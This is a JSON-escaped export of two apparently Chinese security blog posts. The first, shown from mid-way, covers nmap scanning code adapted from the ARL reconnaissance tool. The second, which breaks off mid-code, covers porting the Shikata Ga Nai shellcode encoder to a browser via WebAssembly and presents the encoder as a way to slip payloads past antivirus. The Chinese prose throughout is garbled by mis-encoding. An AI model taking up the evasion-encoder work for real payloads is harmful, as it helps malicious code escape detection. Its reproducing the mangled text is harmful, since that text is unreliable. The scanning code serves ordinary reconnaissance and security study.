style=\"color:#ae81ff\"\u003e400\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; -PE -PS\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eformat(self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ealive_port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehost_timeout \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emax_retries \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; --max-rtt-timeout 800ms\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; --min-rate \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eformat(self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emin_rate)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; --script-timeout 6s\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; --max-hostgroup \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eformat(self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emax_hostgroup)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# ä¾æ®ä¼ è¿‡æ¥çš„è¶…æ—¶ä¸ºå‡†\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e custom_host_timeout \u003cspan style=\"color:#f92672\"\u003eis\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e int(custom_host_timeout) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehost_timeout \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e custom_host_timeout\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; --host-timeout \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003es\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eformat(self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehost_timeout)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; --min-parallelism \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eformat(self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparallelism)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; --max-retries \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eformat(self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emax_retries)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erun\u003c/span\u003e(self):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        logger\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einfo(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nmap target \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e  ports \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e  arguments \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eformat(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etargets[:\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e], self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eports[:\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e], self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        nm \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e nmap\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ePortScanner()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        nm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003escan(hosts\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eself\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etargets, ports\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eself\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eports, arguments\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eself\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ip_info_list \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e host \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e nm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eall_hosts():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            port_info_list \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e proto \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e nm[host]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eall_protocols():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                port_len \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e len(nm[host][proto])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e port \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e nm[host][proto]:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#75715e\"\u003e# å¯¹äºå¼€äº†å¾ˆå¤šç«¯å£çš„ç›´æ¥ä¸¢å¼ƒ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e port_len \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e600\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e (port \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e443\u003c/span\u003e]):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    port_info \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e nm[host][proto][port]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    item \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;port_id\u0026#34;\u003c/span\u003e: port,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;service_name\u0026#34;\u003c/span\u003e: port_info[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;version\u0026#34;\u003c/span\u003e: port_info[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;version\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;product\u0026#34;\u003c/span\u003e: port_info[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;product\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;protocol\u0026#34;\u003c/span\u003e: proto\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    port_info_list\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend(item)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            osmatch_list \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e nm[host]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;osmatch\u0026#34;\u003c/span\u003e, [])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            os_info \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eos_match_by_accuracy(osmatch_list)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ip_info \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e: host,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;port_info\u0026#34;\u003c/span\u003e: port_info_list,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;os_info\u0026#34;\u003c/span\u003e: os_info\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ip_info_list\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend(ip_info)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e ip_info_list\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eos_match_by_accuracy\u003c/span\u003e(self, os_match_list):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e os_match \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e os_match_list:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            accuracy \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e os_match\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;accuracy\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e int(accuracy) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e90\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e os_match\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eå…¥å£æ˜¯run\u003c/p\u003e","title":"ä»arlä¸­å­¦ä¹ åˆ°çš„nmapé…ç½®"},{"content":"Shikata ga naiæ˜¯ä»€ä¹ˆ Metasploit-Frameworkæ˜¯ä¸€ä¸ªæ¼æ´åˆ©ç”¨æ¡†æ¶ï¼Œé‡Œé¢æœ‰å¤§é‡çš„æ¼æ´åº“ï¼Œé’ˆå¯¹shellcodeä¸€äº›æ··æ·†ç¼–ç å™¨å¯ä»¥è®©ç”¨æˆ·bypassä¸€äº›å®‰å…¨è½¯ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªæ¯”è¾ƒæ ¸å¿ƒçš„ç¼–ç å™¨æ˜¯Shikata Ga Nai (SGN)ã€‚\nshellcode ä¸»è¦æ˜¯æœºå™¨ç ï¼Œä¹Ÿå¯ä»¥çœ‹ä½œä¸€æ®µæ±‡ç¼–æŒ‡ä»¤ã€‚Metasploit åœ¨é»˜è®¤é…ç½®ä¸‹å°±ä¼šå¯¹payloadè¿›è¡Œç¼–ç ã€‚è™½ç„¶ Metasploit æœ‰å„ç§ç¼–ç å™¨ï¼Œä½†æœ€å—æ¬¢è¿çš„æ˜¯ SGNã€‚æ—¥è¯­ä¸­çš„çŸ­è¯­ SGN çš„æ„æ€æ˜¯â€œæ— èƒ½ä¸ºåŠ›â€ï¼Œä¹‹æ‰€ä»¥è¿™æ ·è¯´ï¼Œæ˜¯å› ä¸ºå®ƒåœ¨åˆ›å»ºæ—¶ä¼ ç»Ÿçš„åç—…æ¯’äº§å“éš¾ä»¥æ£€æµ‹ã€‚\næ£€æµ‹ SGN ç¼–ç çš„payloadå¾ˆå›°éš¾ï¼Œå°¤å…¶æ˜¯åœ¨ä¸¥é‡ä¾èµ–é™æ€æ£€æµ‹çš„æƒ…å†µä¸‹ã€‚ä»»ä½•åŸºäºè§„åˆ™çš„é™æ€æ£€æµ‹æœºåˆ¶åŸºæœ¬ä¸Šéƒ½æ— æ³•æ£€æµ‹åˆ°ç”¨ SGN ç¼–ç çš„payloadã€‚è€Œä¸æ–­æ‰«æå†…å­˜çš„è®¡ç®—æˆæœ¬å¾ˆé«˜ï¼Œå› æ­¤ä¸å¤ªå¯è¡Œã€‚è¿™ä½¿å¾—å¤§å¤šæ•°æ€è½¯ä¾èµ–äºè¡Œä¸ºæŒ‡æ ‡å’Œæ²™ç®±è¿›è¡Œæ£€æµ‹ã€‚\nä¸ºä»€ä¹ˆè¯´å¸¦åˆ°å‰ç«¯ é¦–å…ˆä»‹ç»ä¸‹ EgeBalci/sgnï¼Œè¿™ä¸ªé¡¹ç›®å°†msfçš„Shikata Ga Naiç¼–ç å™¨ç§»æ¤åˆ°äº†Golangï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥ä¸é€šè¿‡msfå³å¯äº«å—åˆ°SGNçš„èƒ½åŠ›ã€‚\næ—¢ç„¶è¿™ä¸ªé¡¹ç›®æ˜¯éå¹³å°ä¾èµ–çš„å·¥å…·ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è€ƒè™‘å°†å®ƒç§»æ¤åˆ°å‰ç«¯ï¼Œè¿™æ ·ç”¨æˆ·åªéœ€è¦æ‰“å¼€æµè§ˆå™¨å°±èƒ½ç”¨äº†ã€‚\nç§»æ¤æ€è·¯ é¦–å…ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘ï¼šsgnæ˜¯ä¸€ä¸ªgolangé¡¹ç›®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¼–è¯‘åˆ°wasmï¼Œç„¶åæš´éœ²apiç»™javascriptæ¥è°ƒç”¨ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°å‰ç«¯ä½¿ç”¨sgnäº†ã€‚\nä½†æ˜¯é‡åˆ°äº†ä¸€äº›é—®é¢˜ã€‚\nè¯¥é¡¹ç›®å¹¶ä¸æ˜¯ä¸€ä¸ªPure Goé¡¹ç›®ï¼Œå®ƒä¾èµ–cgoï¼Œæ²¡åŠæ³•ç¼–è¯‘åˆ°wasmã€‚\nä½†æ˜¯æˆ‘è®°å¾— github.com/therecipe/qt å¯ä»¥ç¼–è¯‘åˆ°wasmï¼Œé€šè¿‡ä¸€äº›ç ”ç©¶ï¼Œå‘ç°å®ƒæ˜¯é‡‡ç”¨äº†go-js-qtçš„æ¡¥æ¥ï¼Œqtæ˜¯å¯ä»¥ç¼–è¯‘åˆ°wasmçš„ï¼Œgoä¹Ÿå¯ä»¥ç¼–è¯‘åˆ°wasmï¼Œç„¶åä¸¤è€…ä¹‹é—´å†æ¡¥æ¥èµ·æ¥ã€‚é‚£æˆ‘ä»¬å¯ä»¥å°è¯•å…ˆå°† github.com/keystone-engine/keystone ç¼–è¯‘åˆ°wasmï¼Œç„¶åå°†sgné¡¹ç›®é‡Œé¢è°ƒç”¨cgoçš„åœ°æ–¹å…¨éƒ¨ä½¿ç”¨ syscall/js æ¡¥æ¥åˆ°keystoneä¸Šå»ï¼Œæ­¤æ—¶sgnå˜æˆäº†ä¸€ä¸ªPure Goé¡¹ç›®ï¼Œå¯ä»¥å°†å…¶ç¼–è¯‘åˆ°wasmäº†ï¼Œç„¶åå†æš´éœ²å‡ºä¸€ä¸ªæ¥å£å°±å¯ä»¥ä¾›jsä½¿ç”¨äº†\nå®ç°æ‰‹æ®µ cgoåˆ°æ¡¥æ¥ sgné‡Œé¢éœ€è¦ä½¿ç”¨cgoæ˜¯å› ä¸ºä¾èµ– github.com/EgeBalci/keystone-goï¼Œçœ‹äº†ä¸€ä¸‹è¿™ä¸ªé¡¹ç›®ï¼Œå…¶å®æ˜¯keystoneçš„åŒ…è£…ï¼Œkeystoneæ˜¯ä¸€ä¸ªc++å†™çš„é¡¹ç›®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨ emscripten æ¥å°†keystoneç¼–è¯‘åˆ°wasmï¼Œä¸è¿‡è¯¥é¡¹å·¥ä½œå·²ç»æœ‰äººåšäº†ï¼Œæˆ‘ä»¬åœ¨è¿™è¾¹å°±ä¸è‡ªå·±å†èŠ±æ—¶é—´æ­ç¯å¢ƒç¼–è¯‘äº†ï¼Œå¯ä»¥çœ‹çœ‹ alexaltea.github.io/keystone.js/\nç„¶åæˆ‘ä»¬çœ‹çœ‹sgné‡Œé¢ä¾èµ–cgoçš„åœ°æ–¹ï¼Œä¸»è¦æ˜¯åœ¨ pkg/sgn.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package sgn import ( ... \u0026#34;github.com/EgeBalci/keystone-go\u0026#34; ) ... // Assemble assembes the given instructions // and return a byte array with a boolean value indicating wether the operation is successful or not func (encoder Encoder) Assemble(asm string) ([]byte, bool) { var mode keystone.Mode switch encoder.architecture { case 32: mode = keystone.MODE_32 case 64: mode = keystone.MODE_64 default: return nil, false } ks, err := keystone.New(keystone.ARCH_X86, mode) if err != nil { return nil, false } defer ks.Close() err = ks.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL) if err != nil { return nil, false } //log.Println(asm) bin, _, ok := ks.Assemble(asm, 0) return bin, ok } // GetAssemblySize assembes the given instructions and returns the total instruction size // if assembly fails return value is -1 func (encoder Encoder) GetAssemblySize(asm string) int { var mode keystone.Mode switch encoder.architecture { case 32: mode = keystone.MODE_32 case 64: mode = keystone.MODE_64 default: return -1 } ks, err := keystone.New(keystone.ARCH_X86, mode) if err != nil { return -1 } defer ks.Close() err = ks.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL) if err != nil { return -1 } //log.Println(asm) bin, _, ok := ks.Assemble(asm, 0) if !ok { return -1 } return len(bin) } ... å…¶å®å·¥ä½œé‡å¹¶ä¸å¤§ï¼Œåªæ˜¯éœ€è¦æŠŠæ‰€æœ‰å¯¹ keystone-go çš„è°ƒç”¨æ¢åˆ°keystone.jsä¸Šå³å¯ã€‚\nå¯ä»¥ä¸€æ­¥æ­¥æŒ‰ç…§ https://pkg.go.dev/syscall/js ä¸Šé¢çš„apiæ–‡æ¡£å¯¹ç…§ç€æ”¹ï¼Œè¿™é‡Œæˆ‘å°±ä¸è¯¦ç»†é˜è¿°è¯­æ³•äº†ï¼Œä¹‹é—´å°†æ”¹åŠ¨åçš„è´´ä¸Šæ¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 package sgn import ( ... \u0026#34;syscall/js\u0026#34; ) func GetKeystone() js.Value { return js.Global().Get(\u0026#34;ks\u0026#34;) } // Assemble assembes the given instructions // and return a byte array with a boolean value indicating wether the operation is successful or not func (encoder Encoder) Assemble(asm string) ([]byte, bool) { var mode js.Value switch encoder.architecture { case 32: mode = GetKeystone().Get(\u0026#34;MODE_32\u0026#34;) case 64: mode = GetKeystone().Get(\u0026#34;MODE_64\u0026#34;) default: return nil, false } keystoneFunc := GetKeystone().Get(\u0026#34;Keystone\u0026#34;) ks := keystoneFunc.New(GetKeystone().Get(\u0026#34;ARCH_X86\u0026#34;), mode) if !ks.Truthy() { return nil, false } defer ks.Call(\u0026#34;close\u0026#34;) ks.Call(\u0026#34;option\u0026#34;, GetKeystone().Get(\u0026#34;OPT_SYNTAX\u0026#34;), GetKeystone().Get(\u0026#34;OPT_SYNTAX_INTEL\u0026#34;)) v := ks.Call(\u0026#34;asm\u0026#34;, asm) if !v.Truthy() { return nil, false } ok := !v.Get(\u0026#34;failed\u0026#34;).Bool() if !v.Get(\u0026#34;mc\u0026#34;).Truthy() { return nil, false } var bin = make([]byte, v.Get(\u0026#34;mc\u0026#34;).Length()) for i:=0; i\u0026lt;v.Get(\u0026#34;mc\u0026#34;).Length(); i++ { bin[i] = byte(v.Get(\u0026#34;mc\u0026#34;).Index(i).Int()) } return bin, ok } // GetAssemblySize assembes the given instructions and returns the total instruction size // if assembly fails return value is -1 func (encoder Encoder) GetAssemblySize(asm string) int { var mode js.Value switch encoder.architecture { case 32: mode = GetKeystone().Get(\u0026#34;MODE_32\u0026#34;) case 64: mode = GetKeystone().Get(\u0026#34;MODE_64\u0026#34;) default: return -1 } keystoneFunc := GetKeystone().Get(\u0026#34;Keystone\u0026#34;) ks := keystoneFunc.New(GetKeystone().Get(\u0026#34;ARCH_X86\u0026#34;), mode) if !ks.Truthy() { return -1 } defer ks.Call(\u0026#34;close\u0026#34;) 